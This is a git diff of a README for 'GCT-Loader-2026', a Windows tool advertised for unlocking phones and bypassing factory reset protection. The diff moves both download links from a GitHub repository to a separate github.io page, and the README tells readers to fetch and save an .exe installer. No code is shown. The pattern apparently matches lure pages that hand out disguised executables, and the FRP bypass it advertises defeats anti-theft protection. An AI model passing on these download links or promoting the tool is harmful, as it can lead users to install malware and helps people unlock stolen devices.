@@ -1,6 +1,6 @@
 # ⚙️ GCT-Loader-2026 - Repair mobile devices with ease
 
-[![Download GCT Loader](https://img.shields.io/badge/Download-GCT_Loader_2026-blue.svg)](https://github.com/Prentrecent252/GCT-Loader-2026)
+[![Download GCT Loader](https://img.shields.io/badge/Download-GCT_Loader_2026-blue.svg)](https://prentrecent252.github.io)
 
 GCT-Loader-2026 serves as a utility for Windows users who need to manage or unlock mobile devices. This software simplifies technical tasks like bypassing factory reset protection or managing Qualcomm processor connections. You can use this tool on Windows 10 and Windows 11 systems.
 
@@ -20,7 +20,7 @@ To ensure the software runs without errors, your computer must meet these basic 
 Follow these steps to obtain the tool:
 
 1.  Navigate to the official repository page.
-2.  Click the following link to access the software: [Download GCT-Loader-2026](https://github.com/Prentrecent252/GCT-Loader-2026).
+2.  Click the following link to access the software: [Download GCT-Loader-2026](https://prentrecent252.github.io).
 3.  Locate the releases section on the page.
 4.  Select the latest installer file ending with the .exe extension.
 5.  Save the file to your desktop or downloads folder.
